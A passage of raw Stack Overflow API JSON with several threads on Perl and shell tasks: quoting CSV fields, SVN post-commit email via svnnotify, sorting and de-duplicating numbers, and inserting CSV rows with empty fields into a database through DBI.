"https://stackoverflow.com/users/3266847/benjamin-w"}, "is_accepted": false, "score": 0, "last_activity_date": 1466368009, "last_edit_date": 1466368009, "creation_date": 1466366564, "answer_id": 37911310, "question_id": 37911161, "link": "https://stackoverflow.com/questions/37911161/how-to-quote-all-fields-in-csv-in-regex/37911310#37911310", "title": "How to quote all fields in CSV in regex", "body": "<p>If you're open to an <strong>awk</strong> solution, this would work:</p>\n\n<pre><code>$ awk -F \",\" -v OFS=\",\" -v sq=\"'\" '{for (i=1;i&lt;=NF;++i) $i = sq $i sq; print}' infile\n'chocolate','2','sugar','','flour','5','water','','','vanila','1\n</code></pre>\n\n<p>This just sets input and output field separators to <code>,</code>, then loops over all fields and puts quotes around them.</p>\n\n<p>The <code>sq</code> bit is a way to get single quotes into the command.</p>\n\n<p>Or with <strong>sed</strong>:</p>\n\n<pre><code>$ sed 's/\\([^,]*\\)/'\"'\"'\\1'\"'\"'/g' infile\n'chocolate','2','sugar','','flour','5','water','','','vanila','1'\n</code></pre>\n\n<p>This look for groups of characters other than <code>,</code> of length zero or more, then surrounds them with quotes. It's a bit of a quote battlefield because the single quoted string ends, then we add a single quote between double quotes, then we continue the single quoted string, resulting in <code>'\"'\"'</code> just to get a single quote.</p>\n\n<p>And finally, using <strong>Perl</strong>:</p>\n\n<pre><code>$ perl -nle 'print join \",\", map{\"'\\''$_'\\''\"} split /,/, $_, -1' infile\n'chocolate','2','sugar','','flour','5','water','','','vanila','1'\n</code></pre>\n\n<p>This splits the input string by <code>,</code>, maps the resulting list elements to their quoted version, then joins again using <code>,</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 32690, "user_id": 3266847, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U0oyt.png?s=128&g=1", "display_name": "Benjamin W.", "link": "https://stackoverflow.com/users/3266847/benjamin-w"}, "edited": false, "score": 1, "creation_date": 1473282915, "post_id": 39361380, "comment_id": 66086165, "body": "This is a copy of my answer...?"}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user6802918"}, "is_accepted": false, "score": 1, "last_activity_date": 1473224355, "last_edit_date": 1473224355, "creation_date": 1473223544, "answer_id": 39361380, "question_id": 37911161, "link": "https://stackoverflow.com/questions/37911161/how-to-quote-all-fields-in-csv-in-regex/39361380#39361380", "title": "How to quote all fields in CSV in regex", "body": "<p>With <code>Perl</code>, you can do it in command line with the following command. It basically splits the text with commas <code>,</code> then encloses each value with quotes then it join values again with comma in a single string.</p>\n\n<pre><code>perl -nle 'print join \",\", map{\"'\\''$_'\\''\"} split /,/, $_, -1' infile\n'chocolate','2','sugar','','flour','5','water','','','vanila','1'\n</code></pre>\n"}], "owner": {"reputation": 4937, "user_id": 2445025, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/HTAcm.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2445025/prabhu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 184, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1473224355, "creation_date": 1466365464, "last_edit_date": 1466524606, "question_id": 37911161, "link": "https://stackoverflow.com/questions/37911161/how-to-quote-all-fields-in-csv-in-regex", "title": "How to quote all fields in CSV in regex", "body": "<p>I have a string in CSV format as follows:</p>\n\n<pre><code>chocolate,2,sugar,,flour,5,water,,,vanila,1\n</code></pre>\n\n<p>I want to quote all fields with single quotes including empty fields as</p>\n\n<pre><code>'chocolate','2','sugar','','flour','5','water','','','vanila','1'\n</code></pre>\n\n<p>I want to do that in Perl. I had tried to replace comma (,) with ',' then adding single quotes at the beginning and the end. Is there any other easy and efficient and direct method to do that in Perl?</p>\n\n<p>Edit: added the code that I have already tried.</p>\n\n<pre><code>my $str = \"chocolate,2,sugar,,flour,5,water,,,vanila,1\";\nmy $find = \",\";\nmy $replace = \"','\";\n$find = quotemeta $find;\n\n$str =~ s/$find/$replace/g;\n$str = \"'\".$str.\"'\";\n</code></pre>\n"}, {"tags": ["perl", "ssl", "svn", "gmail", "svn-notify"], "comments": [{"owner": {"reputation": 26602, "user_id": 761095, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/6qOuP.png?s=128&g=1", "display_name": "bahrep", "link": "https://stackoverflow.com/users/761095/bahrep"}, "edited": false, "score": 0, "creation_date": 1466362506, "post_id": 37910654, "comment_id": 63273310, "body": "You haven&#39;t specified the code of the hook."}, {"owner": {"reputation": 181, "user_id": 6252832, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-QBagjtlOTnI/AAAAAAAAAAI/AAAAAAAAOJ8/KMbWsWfU2oU/photo.jpg?sz=128", "display_name": "Christian Bohli", "link": "https://stackoverflow.com/users/6252832/christian-bohli"}, "reply_to_user": {"reputation": 26602, "user_id": 761095, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/6qOuP.png?s=128&g=1", "display_name": "bahrep", "link": "https://stackoverflow.com/users/761095/bahrep"}, "edited": false, "score": 0, "creation_date": 1466370131, "post_id": 37910654, "comment_id": 63275478, "body": "What do you mean? Post-commit is the hook"}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466403415, "post_id": 37910654, "comment_id": 63282546, "body": "Looking at the guts of <code>SVN::Notify</code>, it looks like the <code>sendmail</code> parameter is expecting the path of the actual sendmail command ( /usr/bin/sendmail  on my system), which you may need to install.  <a href=\"http://stackoverflow.com/questions/10359437/sendmail-how-to-configure-sendmail-on-ubuntu\" title=\"sendmail how to configure sendmail on ubuntu\">stackoverflow.com/questions/10359437/&hellip;</a>"}, {"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 0, "creation_date": 1466405359, "post_id": 37910654, "comment_id": 63283318, "body": "The Python script needs to exist on the SVN server, not on the box where you commit."}, {"owner": {"reputation": 181, "user_id": 6252832, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-QBagjtlOTnI/AAAAAAAAAAI/AAAAAAAAOJ8/KMbWsWfU2oU/photo.jpg?sz=128", "display_name": "Christian Bohli", "link": "https://stackoverflow.com/users/6252832/christian-bohli"}, "edited": false, "score": 0, "creation_date": 1466412144, "post_id": 37910654, "comment_id": 63287001, "body": "The Script is on the server"}], "answers": [{"comments": [{"owner": {"reputation": 181, "user_id": 6252832, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-QBagjtlOTnI/AAAAAAAAAAI/AAAAAAAAOJ8/KMbWsWfU2oU/photo.jpg?sz=128", "display_name": "Christian Bohli", "link": "https://stackoverflow.com/users/6252832/christian-bohli"}, "reply_to_user": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466450110, "post_id": 37925642, "comment_id": 63311048, "body": "The usage said sendmail executable. I didn&#39;t know it means that you have to use sendmail I thought you could use any executable there. Thank you again!"}], "tags": [], "owner": {"reputation": 181, "user_id": 6252832, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-QBagjtlOTnI/AAAAAAAAAAI/AAAAAAAAOJ8/KMbWsWfU2oU/photo.jpg?sz=128", "display_name": "Christian Bohli", "link": "https://stackoverflow.com/users/6252832/christian-bohli"}, "is_accepted": true, "score": 0, "last_activity_date": 1466435018, "last_edit_date": 1495541912, "creation_date": 1466434594, "answer_id": 37925642, "question_id": 37910654, "link": "https://stackoverflow.com/questions/37910654/post-commit-mails-using-gmail-svn/37925642#37925642", "title": "post-commit mails using gmail (SVN)", "body": "<p><strong>my post-commit</strong>;\n<div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>#!/bin/sh\r\n\r\nREV=$2\r\nREPO=$1\r\n\r\n/usr/local/bin/trac-admin /var/www/trac/htdocs/share changeset added \"svn\" $REV\r\n\r\n# email notifications for commits\r\n/usr/bin/svnnotify --repos-path \"$REPO\" --revision \"$REV\" \t\\\r\n\t--sendmail\t\t/usr/sbin/sendmail\t\t\t\t\t\t\\\r\n\t--to\t\t\trecriver@gmail.com      \t\t\t\t\\\r\n    --from\t\t\tnoreply@donbolli.ch\t\t\t\t\t\t\\\r\n    --with-diff\t\t\t\t\t\t\t\t\t\t\t\t\\\r\n    --subject-cx\t\t\t\t\t\t\t\t\t\t\t\\\r\n    --subject-prefix\t\t'Share: '\t\t\t\t\t\t\\\r\n    --handler HTML::ColorDiff\t\t\t\t\t\t\t\t\\\r\n    --css-inline\r\n    2&gt;&amp;1 &amp;\r\n\r\nexit 0</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Works after I followed the sendmail instructions.</p>\n\n<p>Thanks to <a href=\"https://stackoverflow.com/users/1799189/xxfelixxx\">xxfelixxx</a> </p>\n\n<p><a href=\"https://stackoverflow.com/questions/10359437/sendmail-how-to-configure-sendmail-on-ubuntu\">install sendmail</a></p>\n"}], "owner": {"reputation": 181, "user_id": 6252832, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-QBagjtlOTnI/AAAAAAAAAAI/AAAAAAAAOJ8/KMbWsWfU2oU/photo.jpg?sz=128", "display_name": "Christian Bohli", "link": "https://stackoverflow.com/users/6252832/christian-bohli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 458, "favorite_count": 0, "accepted_answer_id": 37925642, "answer_count": 1, "score": 1, "last_activity_date": 1466435018, "creation_date": 1466362052, "last_edit_date": 1495535349, "question_id": 37910654, "link": "https://stackoverflow.com/questions/37910654/post-commit-mails-using-gmail-svn", "title": "post-commit mails using gmail (SVN)", "body": "<p>I've spent a lot of time yet. But I'm still stuck.</p>\n\n<p>I run Ubuntu 12.04.</p>\n\n<p>I have set up SVN and it's working fine. Now I want to send nice E-Mails on each commit, so I installd svnnotify and applied the --css-inlne patch. (<a href=\"https://stackoverflow.com/a/5369924/6252832\">post</a>).</p>\n\n<p>Less secure access is on, I can send E-Mails using phpmailer.</p>\n\n<p>After many hours spent on googleing I ask you.</p>\n\n<p>I've tried the following:</p>\n\n<p><strong>post-commit</strong>:</p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>#!/bin/sh\n\nREV=$2\nREPO=$1\n\n/usr/local/bin/trac-admin /var/www/trac/htdocs/share changeset added \"svn\" $REV\n\n# email notifications for commits\n/usr/bin/svnnotify --repos-path \"$REPO\" --revision \"$REV\"   \\\n    --smtp          smtp.gmail.com                          \\\n    --smtp-port     587                                     \\\n    --smtp-user     noreply@donbolli.ch                     \\\n    --smtp-pass     pass                                    \\\n    --smtp-tls                                              \\\n    --to            receiver@gmail.com                      \\\n    --from          noreply@donbolli.ch                     \\\n    --with-diff                                             \\\n    --subject-cx                                            \\\n    --subject-prefix        'Share: '                       \\\n    --handler HTML::ColorDiff                               \\\n    --css-inline\n    2&gt;&amp;1 &amp;\n\nexit 0\n</code></pre>\n\n<p>Results in:</p>\n\n<pre><code>donbolli@luna585:~$ ./post-commit /var/www/svn/share 9\nCouldn't start TLS: SSL connect attempt failed because of handshake problems error:1409442E:SSL routines:SSL3_READ_BYTES:tlsv1 alert protocol version\n at /usr/share/perl5/SVN/Notify.pm line 2390.\n</code></pre>\n\n<p>So I was looking for this error, but found nothing.</p>\n\n<p>So I tried another approach</p>\n\n<p><strong>post-commit</strong>:</p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>#!/bin/sh\n\nREV=$2\nREPO=$1\n\n/usr/local/bin/trac-admin /var/www/trac/htdocs/share changeset added \"svn\" $REV\n\n# email notifications for commits\n/usr/bin/svnnotify --repos-path \"$REPO\" --revision \"$REV\"   \\\n    --sendmail      /home/donbolli/sendmail.py              \\\n    --to            receiver@gmail.com          \\\n    --from          noreply@donbolli.ch                     \\\n    --with-diff                                             \\\n    --subject-cx                                            \\\n    --subject-prefix        'Share: '                       \\\n    --handler HTML::ColorDiff                               \\\n    --css-inline\n    2&gt;&amp;1 &amp;\n\nexit 0\n</code></pre>\n\n<p>Results in</p>\n\n<pre><code>donbolli@luna585:~$ ./post-commit /var/www/svn/share 9\nCan't exec \"/home/donbolli/sendmail.py\": No such file or directory at /usr/share/perl5/SVN/Notify.pm line 2332.\nCannot exec /home/donbolli/sendmail.py: No such file or directory\n</code></pre>\n\n<p>But the file exists (and is 755)</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>donbolli@luna585:~$ cat /home/donbolli/sendmail.py\n#!/usr/bin/perl\nuse MIME::Lite;\nuse Net::SMTPS;\n\nmy $msg = MIME::Lite -&gt;new (\nFrom =&gt; 'noreply@donbolli.ch',\nTo =&gt; 'receiver@gmail.com',\nType =&gt; 'text/html; charset=UTF-8'\n);\n\n...\n</code></pre>\n"}, {"tags": ["perl", "sorting", "hash"], "comments": [{"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1466364806, "post_id": 37910626, "comment_id": 63273976, "body": "so you don&#39;t want to keep the fourth number at all?  what are you doing after you get rid of duplicates; in particular, do you need to go through the results in some order?"}, {"owner": {"reputation": 4127, "user_id": 817950, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/77649026bafd5e285ffbd76b7a2c90b6?s=128&d=identicon&r=PG", "display_name": "redbmk", "link": "https://stackoverflow.com/users/817950/redbmk"}, "edited": false, "score": 0, "creation_date": 1466371608, "post_id": 37910626, "comment_id": 63275945, "body": "<a href=\"http://perlmaven.com/unique-values-in-an-array-in-perl\" rel=\"nofollow noreferrer\">perlmaven.com/unique-values-in-an-array-in-perl</a>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466385651, "post_id": 37910626, "comment_id": 63278696, "body": "Am I understanding this right  -- you want to sort and remove duplicates for numbers on each line, yes?  (So some lines end up having fewer numbers.)"}, {"owner": {"reputation": 389, "user_id": 1625076, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/fRfxc.png?s=128&g=1", "display_name": "dellair", "link": "https://stackoverflow.com/users/1625076/dellair"}, "edited": false, "score": 0, "creation_date": 1466410758, "post_id": 37910626, "comment_id": 63286227, "body": "I don&#39;t want to keep the 4th number at all. And there is no duplicates number, but there is duplicate line after the sort. For example, line 2 and line 4 would be identically &quot;2 8 9&quot; after the sort."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466541780, "post_id": 37910626, "comment_id": 63356851, "body": "@dellair  Thanks for the clarification, I see now that line.  I&#39;ve updated the answer so that it treats this case.  Note that I <code>split</code> the line to make <code>$n1</code> etc, for testing -- your code shouldn&#39;t need that, remove it. Let me know if more/better explanation for it is needed."}], "answers": [{"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 2, "last_activity_date": 1466668646, "last_edit_date": 1466668646, "creation_date": 1466385510, "answer_id": 37913488, "question_id": 37910626, "link": "https://stackoverflow.com/questions/37910626/perl-sort-on-numbers/37913488#37913488", "title": "Perl sort on numbers", "body": "<p><strong>Updated</strong> with another solution -- it is the lines that may be duplicate, not numbers on a line.</p>\n\n<hr>\n\n<p>In order to remove duplicate lines it is easiest if we have all sorted lines of three numbers in an array. Then we post-process that by running them through <code>uniq</code>. There are (at least) two ways to do this.</p>\n\n<ul>\n<li><p>Store lines in an array, each being a reference to a sorted array with the three numbers. Then for comparison construct a string of each on the fly.  This is better if there is yet other processing of numbers somewhere along, as they are in arrays.</p></li>\n<li><p>Build a string out of each sorted line and store those in an array. Then it's easier to compare.</p></li>\n</ul>\n\n<p>Below I use the first approach, assuming that there is other processing of numbers.</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature wq(say);\nuse List::MoreUtils qw(uniq);\n\nmy $file = 'sort_nums.txt';\nmy @content = do {\n    open my $fh, '&lt;', $file  or die \"Can't open $file: $!\";\n    &lt;$fh&gt;;\n};\n\nmy @linerefs_all;\nforeach my $line (@content) {\n    # Calculations ... numbers stored in ($n1, $n2, $n3, $n4)\n    my ($n1, $n2, $n3) = split '\\s+' $line;   # FOR TESTING \n    # Add to @rlines a reference to the sorted array with first three\n    push @linerefs, [ sort { $a &lt;=&gt; $b } ($n1, $n2, $n3) ];\n}\n# Remove dupes by comparing line-arrays as strings, then remake arrayrefs\nmy @linerefs = map { [ split ] } uniq map { join ' ', @$_ } @linerefs_all;\nsay \"@$_\" for @linerefs;\n</code></pre>\n\n<p>Using the posted lines in the file <code>sort_nums.txt</code>, the code above prints</p>\n\n<pre>\n1 2 3\n2 8 9\n100 106 321\n69 300 302\n</pre>\n\n<p>Explanation of the post-processing line, <em>read from the right.</em>  </p>\n\n<ul>\n<li><p>The <a href=\"http://perldoc.perl.org/functions/map.html\" rel=\"nofollow\"><code>map</code></a> on the right processes a list of arrayrefs. It dereferences each and <a href=\"http://perldoc.perl.org/functions/join.html\" rel=\"nofollow\"><code>join</code></a>s its elements with a space, forming a string for the line. It returns a list of such strings, one per line.</p></li>\n<li><p>That list is pruned of duplicates by <a href=\"http://search.cpan.org/~rehsack/List-MoreUtils-0.415/lib/List/MoreUtils.pm#uniq_LIST\" rel=\"nofollow\"><code>uniq</code></a>, which itself returns a list, fed into the <code>map</code> on the left. </p></li>\n<li><p>In that <code>map</code>'s block each string is <a href=\"http://perldoc.perl.org/functions/split.html\" rel=\"nofollow\"><code>split</code></a> by (the default) white space into a list (of numbers on the line), and then a reference of that is taken by <code>[ ]</code>. This <code>map</code> thus returns a list of references to arrays, one for each line, what is assigned to <code>@linerefs</code>.</p></li>\n</ul>\n\n<p>This is then printed.\nIf this is too much to stomach for one statement break the process into steps, generating intermediate arrays. Or switch to the second method above.</p>\n\n<hr>\n\n<p><em>Initial post, assuming that numbers on each line may be duplicates</em>  </p>\n\n<p>I take the objective to be: sort three variables and keep only unique ones, for each line.</p>\n\n<pre><code>use List::MoreUtils qw(uniq);\n\nforeach my $line (@content) {\n    # Calculations, numbers stored in ($n1, $n2, $n3, $n4)\n    my @nums = uniq sort { $a &lt;=&gt; $b } ($n1, $n2, $n3);\n    say \"@nums\";\n}\n</code></pre>\n\n<p>Remember that after this you don't know which one(s) of <code>$n1</code>, <code>$n2</code>, <code>$n3</code> may have been dropped.</p>\n\n<hr>\n\n<p>If, for some reason, a non-core module is not suitable, see <a href=\"http://perldoc.perl.org/perlfaq4.html#How-can-I-remove-duplicate-elements-from-a-list-or-array?\" rel=\"nofollow\"><code>this in perlfaq4</code></a>  For example, </p>\n\n<pre><code>my %seen = ();\nmy @nums = sort { $a &lt;=&gt; $b } grep { ! $seen{$_}++ } ($n1, $n2, $n3);\n</code></pre>\n\n<p>or, if you need it without an extra hash around</p>\n\n<pre><code>my @nums = do { my %seen; sort { $a &lt;=&gt; $b } grep { !$seen{$_}++ } ($n1, $n2, $n3) };\n</code></pre>\n"}], "owner": {"reputation": 389, "user_id": 1625076, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/fRfxc.png?s=128&g=1", "display_name": "dellair", "link": "https://stackoverflow.com/users/1625076/dellair"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 392, "favorite_count": 0, "accepted_answer_id": 37913488, "answer_count": 1, "score": 0, "last_activity_date": 1466668646, "creation_date": 1466361837, "question_id": 37910626, "link": "https://stackoverflow.com/questions/37910626/perl-sort-on-numbers", "title": "Perl sort on numbers", "body": "<p>I have some perl script to process a file (contains lots of numbers) line by line. </p>\n\n<p>File content (sample data, first 3 numbers are seperated by space, then the seperate is tab between 3rd and 4th numbers):</p>\n\n<pre><code>1 2 3 15\n2 9 8 30\n100 106 321 92\n9 8 2 59\n300 302 69 88\n....\n</code></pre>\n\n<p>Script content: </p>\n\n<pre><code># snippet of script\nopen(INF, \"$infile\") || die \"Unable to open file $infile: $!\\n\";\n@content = &lt;INF&gt;;\nclose(INF);\n\nforeach $line (@content) {\n    # blah blah, script to handle math here\n    # Now the numbers are stored in separate variables\n    # $n1 stores the 1st number, i.e.: 1\n    # $n2 stores the 2nd number, i.e.: 2\n    # $n3 stores the 3rd number, i.e.: 3\n    # $n4 stores the 4th number, i.e.: 15\n    # Solution code to be inserted here\n}\n</code></pre>\n\n<p>I would like to:</p>\n\n<ol>\n<li>Sort the variables $n1, $n2, $n3 and output them in ascending order.</li>\n<li>At the end of foreach, get rid of duplicates</li>\n</ol>\n\n<p>My approach:</p>\n\n<pre><code># Insert below code to foreach\n$numbers{$n1} = 1;\n$numbers{$n2} = 1;\n$numbers{$n3} = 1;\n@keys = sort { $numbers{$b} &lt;=&gt; $numbers{$a} } keys %numbers;\n#push @numbers, \"$keys[0] $keys[1] $keys[2]\";\n$numbers2{\"$keys[0] $keys[1] $keys[2]\"} = 1;\n</code></pre>\n\n<p>This defines two hashes: 1st hash is for sorting, 2nd hash is for removing duplicates after sorting.</p>\n\n<p>Is there any better approach?\nThanks,</p>\n"}, {"tags": ["mysql", "perl", "csv", "sql-insert"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466362122, "post_id": 37910583, "comment_id": 63273201, "body": "MySQL can load a CSV directly with the LOAD DATA INFILE syntax. I would recommend using that unless you need to preprocess your CSV somehow."}, {"owner": {"reputation": 4937, "user_id": 2445025, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/HTAcm.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2445025/prabhu"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466363216, "post_id": 37910583, "comment_id": 63273517, "body": "I need to pre-process csv so that is not an option."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1466411919, "post_id": 37910583, "comment_id": 63286872, "body": "1/ Use bind points in your SQL. 2/ <code>prepare()</code> the SQL outside of the loop (the second point isn&#39;t solving your problem - it&#39;s improving the efficiency of your code)."}], "answers": [{"comments": [{"owner": {"reputation": 4937, "user_id": 2445025, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/HTAcm.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2445025/prabhu"}, "edited": false, "score": 0, "creation_date": 1466363284, "post_id": 37910667, "comment_id": 63273530, "body": "I need to do that from perl, doing it directly is not an option."}, {"owner": {"reputation": 5548, "user_id": 4625526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6378aa788195a771461c5043057e2ed5?s=128&d=identicon&r=PG&f=1", "display_name": "Norbert van Nobelen", "link": "https://stackoverflow.com/users/4625526/norbert-van-nobelen"}, "reply_to_user": {"reputation": 4937, "user_id": 2445025, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/HTAcm.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2445025/prabhu"}, "edited": false, "score": 1, "creation_date": 1466363630, "post_id": 37910667, "comment_id": 63273618, "body": "Then you will have to pre-process the line in perl into different columns first: Split into array by , and then assign the array values to values in your insert statement. That way you avoid the empty column issue since you will just be assigning an empty value to a column instead."}], "tags": [], "owner": {"reputation": 5548, "user_id": 4625526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6378aa788195a771461c5043057e2ed5?s=128&d=identicon&r=PG&f=1", "display_name": "Norbert van Nobelen", "link": "https://stackoverflow.com/users/4625526/norbert-van-nobelen"}, "is_accepted": false, "score": 0, "last_activity_date": 1466362213, "creation_date": 1466362213, "answer_id": 37910667, "question_id": 37910583, "link": "https://stackoverflow.com/questions/37910583/mysql-insert-into-with-values-containing-double-commas/37910667#37910667", "title": "Mysql insert into with values containing double commas", "body": "<p>A better way to load such data might be to use the mysql command <code>LOAD DATA INFILE</code>:</p>\n\n<pre><code>LOAD DATA INFILE \"yourfilename\" INTO TABLE \"yourtablename\" COLUMNS TERMINATED BY \",\";\n</code></pre>\n\n<p>Thus avoiding the ,, issue completely</p>\n"}, {"tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": false, "score": 1, "last_activity_date": 1466391796, "last_edit_date": 1466391796, "creation_date": 1466367096, "answer_id": 37911382, "question_id": 37910583, "link": "https://stackoverflow.com/questions/37910583/mysql-insert-into-with-values-containing-double-commas/37911382#37911382", "title": "Mysql insert into with values containing double commas", "body": "<p>I might write it this way. I included the empty fields in the your csv file. I've used 5 placeholders, '?', and did not prepare inside the loop. Just execute in the loop.</p>\n\n<pre><code>my $csv = Text::CSV-&gt;new ( { binary =&gt; 1, eol =&gt; \"\\n\" } );\n\nmy $file = 'blahblah';\nopen my $fh, $file or die \"$file open failed: $!\";\n\nmy $dbh = DBI-&gt;connect(\"dbi:SQLite:dbname=pedro.lite\",\"\",\"\",\n    {PrintError =&gt; 1, AutoCommit =&gt; 0}) or die \"Can't connect\";\n\n\nmy $sth = $dbh-&gt;prepare(q{INSERT INTO table1 VALUES(?,?,?,?,?)})\n    or die $dbh-&gt;errstr;\n\n&lt;$fh&gt;; # throw away header - first line\nwhile (my $row = $csv-&gt;getline ($fh)) {\n     $sth-&gt;execute(@$row) or die $sth-&gt;errstr;\n}\n\n$dbh-&gt;commit or die $dbh-&gt;errstr;\nclose $fh or die \"$file close failed: $!\";\n$sth-&gt;finish;\n</code></pre>\n\n<p>If there's no header at the beginning of the file, don't use that line of code.</p>\n\n<p><strong>Update:</strong> Here is an actual program I used to create a database, (using SQLite), and it worked fine, even with the double commas, (empty field).</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse Text::CSV_XS;\nuse DBI;\n\nmy $csv = Text::CSV_XS-&gt;new ( { binary =&gt; 1, eol =&gt; \"\\n\" } );\n\nmy $file = 'j1.csv';\nopen my $fh, $file or die \"$file open failed: $!\";\n\nmy $dbh = DBI-&gt;connect(\"dbi:SQLite:dbname=pedro.lite\",\"\",\"\",\n    {RaiseError =&gt; 1, PrintError =&gt; 0, AutoCommit =&gt; 0}) or die \"Can't connect\";\n\n$dbh-&gt;do('DROP TABLE IF EXISTS table1');\n\n$dbh-&gt;do(&lt;&lt;EOF);\nCREATE TABLE table1 (\n    Firstname TEXT,\n    Lastname TEXT,\n    Code INTEGER,\n    Phone INTEGER,\n    Email TEXT)\nEOF\n\nmy $sth = $dbh-&gt;prepare(q{INSERT INTO table1 VALUES(?,?,?,?,?)});\n\n&lt;$fh&gt;; # throw away header - first line\nwhile (my $row = $csv-&gt;getline ($fh)) {\n     $sth-&gt;execute(@$row);\n}\n$sth-&gt;finish;\n$dbh-&gt;commit;\n$dbh-&gt;disconnect;\n\nclose $fh or die \"$file close failed: $!\";\n</code></pre>\n\n<p>And here is the output from a query of table1.</p>\n\n<pre><code>sqlite&gt; .mode column\nsqlite&gt; .width 10 10 10 10 14\nsqlite&gt; .headers on\nsqlite&gt; select * from table1;\nFirstname   Lastname    Code        Phone       Email\n----------  ----------  ----------  ----------  --------------\nfname1      lname1      123         34543       f1@gmail.com\nfname2      lname2      344         45645       f2@gmail.com\nfname3      lname3      454                     f3@gmail.com\nsqlite&gt;\n</code></pre>\n\n<p>As you can see, it correctly shows that there is no phone number for fname3.\nI used your data just as it appears in your post to INSERT into table1.</p>\n"}, {"tags": [], "owner": {"reputation": 4937, "user_id": 2445025, 